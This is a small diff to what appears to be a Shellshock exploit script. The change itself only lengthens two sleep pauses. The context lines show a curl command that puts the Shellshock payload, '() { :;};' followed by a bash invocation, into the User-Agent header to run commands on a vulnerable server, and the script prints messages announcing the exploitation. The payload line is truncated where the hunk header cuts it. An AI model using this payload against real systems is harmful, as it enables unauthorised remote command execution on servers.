@@ -27,7 +27,7 @@ echo ""
 echo ""
 echo ""
 echo ""
-sleep 3
+sleep 5
 
 echo -e "\e[36mStarting Shellshock Vulnerability\e[0m"
 echo""
@@ -39,7 +39,7 @@ curl -A '() { :;}; echo "Content-type: text/plain"; echo; /bin/bash -c "bash --v
 echo""
 echo -e "\e[32;1mShellshock exploited\e[0m"
 
-sleep 3
+sleep 5
 echo ""
 echo""
 echo""
